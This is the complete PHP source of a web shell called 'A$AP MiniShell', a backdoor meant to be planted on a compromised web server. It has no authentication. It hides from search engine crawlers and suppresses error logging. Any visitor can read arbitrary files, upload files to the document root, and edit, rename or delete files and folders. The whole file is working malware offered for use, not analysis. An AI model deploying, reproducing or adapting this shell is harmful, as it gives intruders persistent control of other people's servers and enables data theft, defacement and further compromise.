<?php
/*
A$AP MiniShell
Remake from Galau Priv8 [mini] Shell
 
by ./MyHeartIsyr
*/
@set_time_limit(0); @error_reporting(0); @error_log(0);
$botuseragent = array("Googlebot", "Yahoo! Slurp", "facebookexternalhit", "bingbot", "Yandex", "Rambler", "PycURL", "MSNBot", "ia_archiver");
if(preg_match("/".implode("|", $botuseragent)."/i", $_SERVER['HTTP_USER_AGENT'])){ header("HTTP/1.1 404 Not Found"); exit; }
if(isset($_GET['kupo'])){ $kupo = $_GET['kupo']; @chdir($kupo); }
else { $kupo = @getcwd(); }
$kupo = str_replace("\\", "/", $kupo); $xcwd=""; $xpath=explode("/", $kupo);
foreach($xpath as $xx => $yy){$xcwd.="<a href='?kupo=";for($x=0;$x<=$xx;$x++){$xcwd.=$xpath[$x];if($x!=$xx){$xcwd.="/";}}$xcwd.="'>$yy</a>/";}
function wcek($r, $s){ return is_writable($r) ? "<font color='#00ff00'>$s</font>" : "<font color='#dd0000'>$s</font>"; }
function rcek($r, $s){ return is_readable($r) ? "<font color='#00ff00'>$s</font>" : "<font color='#dd0000'>$s</font>"; }
function perms($file) {
    $perms = fileperms($file);
    if (($perms & 0xC000) == 0xC000) { $info = 's';}
    else if (($perms & 0xA000) == 0xA000) { $info = 'l'; }
    else if (($perms & 0x8000) == 0x8000) { $info = '-'; }
    else if (($perms & 0x6000) == 0x6000) { $info = 'b'; }
    else if (($perms & 0x4000) == 0x4000) { $info = 'd'; }
    else if (($perms & 0x2000) == 0x2000) { $info = 'c'; }
    else if (($perms & 0x1000) == 0x1000) { $info = 'p'; }
    else { $info = 'u'; }
 
    $info .= (($perms & 0x0100) ? 'r' : '-');
    $info .= (($perms & 0x0080) ? 'w' : '-');
    $info .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x' ) : (($perms & 0x0800) ? 'S' : '-'));
 
    $info .= (($perms & 0x0020) ? 'r' : '-');
    $info .= (($perms & 0x0010) ? 'w' : '-');
    $info .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x' ) : (($perms & 0x0400) ? 'S' : '-'));
 
    $info .= (($perms & 0x0004) ? 'r' : '-');
    $info .= (($perms & 0x0002) ? 'w' : '-');
    $info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x' ) : (($perms & 0x0200) ? 'T' : '-'));
    return $info;
}
?>
<html>
<head>
<title>A$AP MiniShell</title>
<meta name="robots" content="noindex, nofollow, noarchive">
<style>
body { background: #000; color: #00ff00; font-family: Agency FB; }
a { text-decoration: none; color: #dd0000; }
a:hover { text-decoration: none; color: #fff; }
input, select { border: 1px solid #fff; background: transparent; color: #fff; }
option { background: black; color: white; }
textarea { resize: none; background: transparent; color: #fff; border: 1px solid #fff; width:100%; height:400px; }
h1 { font-weight:14px;font-size:40px;background:transparent;color:#fff;text-shadow:0 0 3px #00ff00,0 0 5px #00ff00,0 0 9px #00ff00,0 0 20px #00ff00,0 0 25px #00ff00,0 0 30px #00ff00,0 0 50px #00ff00; }
#home { width: 100%; border-top: 1px solid #00ff00; border-bottom: 1px solid #00ff00; border-left: 1px solid #00ff00; border-right: 1px solid #00ff00; }
#home table, tr, td { border: 1px none #000; }
#filez { width: 100%; border-top: 1px solid #dd0000; border-bottom: 1px solid #dd0000; border-left: 1px solid #dd0000; border-right: 1px solid #dd0000; }
#filez tr:hover { background: #e7e7e7; color: #000; }
#filez a { text-decoration: none; color: #ffbf00; }
#filez a:hover { text-decoration: none; color: #fff; }
#filez pre { font: 9pt Courier New; }
#filez th { background: #fff; color: #000; }
#info { background: #414141; color: #fff; }
</style>
</head>
<body>
<h1 style="color: #fff;"><center>A$AP MiniShell</center></h1>
<div id="info">
<?=php_uname()?><br>
Current Dir: <?=$xcwd?><br>
<form enctype="multipart/form-data" method="post" style="clear: both;">
<input type="radio" name="tipe" value="biasa">Current Directory
<input type="radio" name="tipe" value="root">Root Document<br>
<input type="file" name="monkey">
<input type="submit" name="aplud" value="Upload">
</form>
<?php
if(isset($_POST['aplud'])){
    switch($_POST['tipe']){
        case "biasa":
            if(@copy($_FILES['monkey']['tmp_name'], @getcwd()."/".$_FILES['monkey']['name'])){
                echo "<script>alert('Berhasil');</script>";
            }
            else {
                echo "<script>alert('Gagal');</script>";
            }
            break;
        case "root":
            $root = $_SERVER['DOCUMENT_ROOT']."/".$_FILES['monkey']['name'];
            $web = $_SERVER['HTTP_HOST']."/".$_FILES['monkey']['name'];
            if(is_writable($_SERVER['DOCUMENT_ROOT'])){
                if(@copy($_FILES['monkey']['tmp_name'], $root)){
                    echo "<script>alert('Berhasil!');</script>";
                }
                else {
                    echo "<script>alert('Gagal!');</script>";
                }
            }
            else {
                echo "<script>alert('Direktorinya gak writeable');</script>";
            }
            break;
        default: echo "<script>alert('Harap pilih opsi');</script>"; break;
    }
}
?>
</div>
<?php
if(isset($_GET['jokax']) && $_GET['jokax'] == "newfile"){
    if(isset($_POST['bikin'])){
        $fp = @fopen($_POST['namanya'], "a");
        if($fp){
            echo "<script>window.location='?kupo=".$kupo."';</script>";
        }
        else {
            echo "<script>alert('Gagal');window.location='?moxan=dosya&kupo=".$kupo."';</script>";
        }
    }
    echo "<center><div id=\"filez\"><table width=\"100%\"><tr><td class=\"gayakonek\">New File</td></tr>
    <tr><td><form method=\"post\">
    <input type=\"text\" name=\"namanya\" value=\"$kupo/new.php\" style=\"width: 450px;\">
    <input type=\"submit\" name=\"bikin\" value=\">>\">
    </form>
    </td></tr></table></div></center>";
}
else if(isset($_GET['jokax']) && $_GET['jokax'] == "newfolder"){
    if(isset($_POST['create'])){
        if(@mkdir($_POST['haku'], 0777)){
            echo "<script>window.location='?moxan=dosya&kupo=$kupo';</script>";
        }
        else {
            echo "<script>alert('Gagal');window.location='?moxan=dosya&kupo=$kupo';</script>";
        }
    }
    echo "<center><div id=\"filez\"><table width=\"100%\"><tr><td class=\"gayakonek\">New Folder</td></tr>
    <tr><td><form method=\"post\">
    <input type=\"text\" name=\"haku\" style=\"width: 450px;\">
    <input type=\"submit\" name=\"create\" value=\">>\">
    </form>
    </td></tr></table></div></center>";
}
else if(isset($_GET['jokax']) && $_GET['jokax'] == "rename"){
    if(isset($_POST['ren'])){
        if(@rename($kupo, "".dirname($kupo)."/".htmlspecialchars($_POST['inikuh'])."")){
            echo "<script>window.location='?moxan=dosya&kupo=$kupo';</script>";
        }
        else {
            echo "<script>alert('Gagal');window.location='?moxan=dosya&kupo=$kupo';</script>";
        }
    }
    echo "<center><div id=\"filez\"><table width=\"100%\"><tr><td class=\"gayakonek\">Rename Folder</td></tr>
    <form method=\"post\">
    <input type=\"text\" name=\"inikuh\" value=\"$kupo\" style=\"width: 450px;\">
    <input type=\"submit\" name=\"create\" value=\">>\">
    </form>
    </td></tr></table></div></center>";
}
else if(isset($_GET['jokax']) && $_GET['jokax'] == "del"){
    if(@rmdir($kupo)){
        echo "<script>window.location=?moxan=dosya&kupo='".dirname($kupo)."';</script>";
    }
    else {
        echo "<script>alert('Gagal Hapus Folder: ".basename($kupo)."');window.location=?moxan=dosya&kupo='$kupo';</script>";
    }
}
else if(isset($_GET['jokax']) && $_GET['jokax'] == "view"){
    echo "<center><div id=\"filez\"><table width=\"100%\"><tr><td class=\"gayakonek\">View File</td></tr>
    <tr><td><pre>".htmlentities(file_get_contents($_GET['lupus']))."</pre>
    </td></tr></table></div></center>";
}
else if(isset($_GET['jokax']) && $_GET['jokax'] == "edit"){
    if(isset($_POST['save'])){
        $grux = @fopen($_GET['lupus'], "w");
        if(fwrite($grux, $_POST['isikun'])){
            echo "<script>alert('Berhasil');</script>";
        }
        else {
            echo "<script>alert('Gagal');</script>";
        }
    }
    echo "<center><div id=\"filez\"><table width=\"100%\"><tr><td class=\"gayakonek\">Edit File</td></tr>
    <tr><td><form method=\"post\">
    <textarea name=\"isikun\">".htmlspecialchars(file_get_contents($_GET['lupus']))."</textarea><br>
    <input type=\"submit\" name=\"save\" value=\">>\">
    </form>
    </td></tr></table></div></center>";
}
else if(isset($_GET['jokax']) && $_GET['jokax'] == "gantiname"){
    if(isset($_POST['proc'])){
        if(@rename($_GET['lupus'], "$kupo/".htmlspecialchars($_POST['baruko'])."")){
            echo "<script>alert('Berhasil');</script>";
        }
        else {
            echo "<script>alert('Gagal');</script>";
        }
    }
    echo "<center><div id=\"filez\"><table width=\"100%\"><tr><td class=\"gayakonek\">Rename File</td></tr>
    <form method=\"post\">
    <tr><td>
    <input type=\"text\" name=\"baruko\" style=\"width: 450px;\" value=\"".basename($_GET['lupus'])."\">
    <input type=\"submit\" name=\"proc\" value=\">>\">
    </form>
    </td></tr></table></div></center>";
}
else if(isset($_GET['jokax']) && $_GET['jokax'] == "rm"){
    if(@unlink($_GET['lupus'])){
        echo "<script>alert('Berhasil');window.location='?moxan=dosya&kupo=$kupo';</script>";
    }
    else {
        echo "<script>alert('Gagal');window.location='?moxan=dosya&kupo=$kupo';</script>";
    }
}
else {
    if(is_dir($kupo) === true){
        echo "<center><div id=\"filez\"><table width=\"100%\">
        <tr>
        <th><center>Name</center></th>
        <th><center>Type</center></th>
        <th><center>Size</center></th>
        <th><center>Last Modified</center></th>
        <th><center>Owner:Group</center></th>
        <th><center>Permission</center></th>
        <th><center>Action</center></th>
        </tr>";
       
        $skensay = scandir($kupo);
        foreach($skensay as $popoji){
            $datatype = filetype($popoji);
            $datatime = date("F d Y g:i:s", filemtime($popoji));
            if(function_exists("posix_getpwuid")){
                $dataowner = posix_getpwuid(fileowner("$kupo/$popoji"));
                $dataowner = $dataowner['name'];
            }
            else {
                $dataowner = fileowner("$kupo/$popoji");
            }
            if(function_exists("posix_getgrgid")){
                $datagroup = posix_getgrgid(filegroup("$kupo/$popoji"));
                $datagroup = $datagroup['name'];
            }
            else {
                $datagroup = filegroup("$kupo/$popoji");
            }
            if(!is_dir("$kupo/$popoji")) continue;
            if($popoji === ".."){
                $kukis = "<a href=\"?moxan=dosya&kupo=".dirname($kupo)."\">$popoji</a>";
            }
            elseif($popoji === "."){
                $kukis = "<a style=\"color: green;\" href=\"?moxan=dosya&kupo=$kupo\">$popoji</a>";
            }
            else {
                $kukis = "<a style=\"color: green;\" href=\"?moxan=dosya&kupo=$kupo/$popoji\">$popoji</a>";
            }
            if($popoji === "." || $popoji === ".."){
                $juki = "<a href=\"?moxan=dosya&jokax=newfile&kupo=$kupo\">New File</a> | <a href=\"?moxan=dosya&jokax=newfolder&kupo=$kupo\">New Folder</a>";
            }
            else {
                $juki = "<a href=\"?moxan=dosya&jokax=rename&kupo=$kupo/$popoji\">Rename</a> | <a href=\"?moxan=dosya&jokax=del&kupo=$kupo/$popoji\">Delete</a>";
            }
            echo "<tr".($n?' class=l3':'').">";
            echo "<td>$kukis</td>";
            echo "<td><center>$datatype</center></td>";
            echo "<td><center>-</center></td>";
            echo "<td><center>$datatime</center></td>";
            echo "<td><center>$dataowner:$datagroup</center></td>";
            echo "<td><center>".wcek("$kupo/$popoji", perms("$kupo/$popoji"))."</center></td>";
            echo "<td style=\"padding-left: 15px;\">$juki</td>";
        }
        echo "</tr>";
        foreach($skensay as $mongo){
            $fatatype = filetype($mongo);
            $fatatime = date("F d Y g:i:s", filemtime($mongo));
            if(function_exists("posix_getpwuid")){
                $fataowner = posix_getpwuid(fileowner("$kupo/$mongo"));
                $fataowner = $fataowner['name'];
            }
            else {
                $fataowner = fileowner("$kupo/$mongo");
            }
            if(function_exists("posix_getgrgid")){
                $fatagroup = posix_getgrgid(filegroup("$kupo/$mongo"));
                $fatagroup = $fatagroup['name'];
            }
            else {
                $fatagroup = filegroup("$kupo/$mongo");
            }
            $fatasize = filesize("$kupo/$mongo")/1024;
            $fatasize = round($fatasize, 3);
            if($fatasize > 1024){
                $fatasize = round($fatasize/1024, 2) . "MB";
            }
            else {
                $fatasize = $fatasize . "KB";
            }
            if(!is_file("$kupo/$mongo")) continue;
            echo "<tr>";
            echo "<td><a style=\"color: red;\" href=\"?moxan=dosya&jokax=view&kupo=$kupo&lupus=$kupo/$mongo\">$mongo</a></td>";
            echo "<td><center>$fatatype</center></td>";
            echo "<td><center>$fatasize</center></td>";
            echo "<td><center>$fatatime</center></td>";
            echo "<td><center>$fataowner:$fatagroup</center></td>";
            echo "<td><center>".rcek("$kupo/$mongo", perms("$kupo/$mongo"))."</center></td>";
            echo "<td style=\"padding-left: 15px\">
            <a href=\"?moxan=dosya&jokax=edit&kupo=$kupo&lupus=$kupo/$mongo\">Edit</a> |
            <a href=\"?moxan=dosya&jokax=gantiname&kupo=$kupo&lupus=$kupo/$mongo\">Rename</a> |
            <a href=\"?moxan=dosya&jokax=rm&kupo=$kupo&lupus=$kupo/$mongo\">Delete</a></td>";
        }
        echo "</tr></table></div>";
    }
    else {
        echo "<font color=\"red\">Can't Scan This Directory</font>";
    }
}
?>
